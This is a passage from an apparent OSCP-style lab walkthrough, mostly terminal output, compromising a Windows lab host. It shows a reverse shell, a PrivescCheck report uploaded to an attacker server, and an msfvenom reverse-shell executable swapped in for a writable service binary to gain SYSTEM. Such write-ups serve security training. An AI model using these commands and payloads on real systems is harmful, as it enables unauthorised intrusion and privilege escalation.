  download_string= f"curl http://{lhost}:8080/{command_shell} -o c:\Windows\Temp\{command_shell}".encode('utf-8')
/home/tester/Desktop/offsec/oscpC/51010.py:41: SyntaxWarning: invalid escape sequence '\W'
  download_string= f"curl http://{lhost}:8080/{command_shell} -o c:\Windows\Temp\{command_shell}".encode('utf-8')
/home/tester/Desktop/offsec/oscpC/51010.py:55: SyntaxWarning: invalid escape sequence '\{'
  shell_string= f"c:\Windows\Temp\{command_shell}".encode('utf-8')
/home/tester/Desktop/offsec/oscpC/51010.py:55: SyntaxWarning: invalid escape sequence '\W'
  shell_string= f"c:\Windows\Temp\{command_shell}".encode('utf-8')
Executing The Command Shell...
 Take The Rose

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.242.155 - - [04/Jul/2026 00:44:22] "GET /met.exe HTTP/1.1" 200 -


```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $rlwrap nc -nlvp 9099
Listening on 0.0.0.0 9099
Connection received on 192.168.242.155 52428
Microsoft Windows [Version 10.0.19045.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\Temp>


```

### PrivescCheck

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-Escalation-PrivscCheck" >}} With the PrivescCheck to easy and check what exploit is easy to use

{{< /toggle >}}

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $wget https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1
--2026-07-04 00:51:52--  https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found

```

open the upload server

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $pip install uploadserver --break-system-packages
Defaulting to user installation because normal site-packages is not writeable
Collecting uploadserver
  Downloading uploadserver-6.0.3-py3-none-any.whl.metadata (9.9 kB)
Downloading uploadserver-6.0.3-py3-none-any.whl (21 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-6.0.3
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $python -m uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

```
C:\Windows\Temp>curl http://192.168.45.161:8080/PrivescCheck.ps1  -o PrivescCheck.ps1
curl http://192.168.45.161:8080/PrivescCheck.ps1  -o PrivescCheck.ps1
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  231k  100  231k    0     0   242k      0 --:--:-- --:--:-- --:--:--  242k


```

Execute the command and exploit as the HTML

```
C:\Windows\Temp>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
```

Download back for windows

```
C:\Windows\Temp>curl -X POST http://192.168.45.161:8000/upload -F "files=@PrivescReport.html"
curl -X POST http://192.168.45.161:8000/upload -F "files=@PrivescReport.html"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 66664    0     0  100 66664      0   425k --:--:-- --:--:-- --:--:--  428k


```

view the html form the browser

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $open PrivescReport.html

```

![Pasted image 20260704011029.png](/ob/Pasted%20image%2020260704011029.png)

https://www.exploit-db.com/exploits/50558

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.161  LPORT=4242 -f exe > mysqld_evil.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $python -m uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.1.10 - - [04/Jul/2026 00:58:38] "GET /upload HTTP/1.1" 200 -
192.168.1.10 - - [04/Jul/2026 00:58:39] code 404, message File not found
192.168.1.10 - - [04/Jul/2026 00:58:39] "GET /favicon.ico HTTP/1.1" 404 -
192.168.242.155 - - [04/Jul/2026 01:08:41] [Uploaded] "PrivescReport.html" --> /home/tester/Desktop/offsec/oscpC/PrivescReport.html
192.168.242.155 - - [04/Jul/2026 01:08:41] "POST /upload HTTP/1.1" 204 -
192.168.242.155 - - [04/Jul/2026 01:20:01] "GET /mysqld_evil.exe HTTP/1.1" 200 -
192.168.242.155 - - [04/Jul/2026 01:21:34] "GET /mysqld_evil.exe HTTP/1.1" 200 -
192.168.242.155 - - [04/Jul/2026 01:22:18] "GET /mysqld_evil.exe HTTP/1.1" 200 -

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-Service-premission" >}} In the PrivescCheck shows that there is the Service Permission , so i will change the exe file to my shell.exe and restart the service to have the RCE

{{< /toggle >}}

![Pasted image 20260704011029.png](/ob/Pasted%20image%2020260704011029.png)

Create the shell first

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.161  LPORT=4242 -f exe > mysqld_evil.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes

```

start the server

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $python -m uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.1.10 - - [04/Jul/2026 00:58:38] "GET /upload HTTP/1.1" 200 -
192.168.1.10 - - [04/Jul/2026 00:58:39] code 404, message File not found
192.168.1.10 - - [04/Jul/2026 00:58:39] "GET /favicon.ico HTTP/1.1" 404 -
192.168.242.155 - - [04/Jul/2026 01:08:41] [Uploaded] "PrivescReport.html" --> /home/tester/Desktop/offsec/oscpC/PrivescReport.html
192.168.242.155 - - [04/Jul/2026 01:08:41] "POST /upload HTTP/1.1" 204 -
192.168.242.155 - - [04/Jul/2026 01:20:01] "GET /mysqld_evil.exe HTTP/1.1" 200 -
192.168.242.155 - - [04/Jul/2026 01:21:34] "GET /mysqld_evil.exe HTTP/1.1" 200 -
192.168.242.155 - - [04/Jul/2026 01:22:18] "GET /mysqld_evil.exe HTTP/1.1" 200 -

```

download the service

```
C:\Windows\Temp>curl http://192.168.45.161:8000/mysqld_evil.exe -o mysqld_evil.exe

curl http://192.168.45.161:8000/mysqld_evil.exe -o mysqld_evil.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7168  100  7168    0     0  97541      0 --:--:-- --:--:-- --:--:-- 99555

```

stop the servcie

```
C:\Windows\Temp>sc.exe stop GPGOrchestrator
sc.exe stop GPGOrchestrator

SERVICE_NAME: GPGOrchestrator 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

```

change to powershell

```
C:\Windows\Temp>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```

change the exe file

```
PS C:\Windows\Temp> cp mysqld_evil.exe  "C:\Program Files\MilleGPG5\GPGService.exe"
cp mysqld_evil.exe  "C:\Program Files\MilleGPG5\GPGService.exe"

```

start the service

```
PS C:\Windows\Temp> sc.exe start  GPGOrchestrator
sc.exe start  GPGOrchestrator


```

Have the RCE

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $nc -lvp 4242
Listening on 0.0.0.0 4242
Connection received on 192.168.242.155 53102
Microsoft Windows [Version 10.0.19045.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami 
whoami 
nt authority\system

```
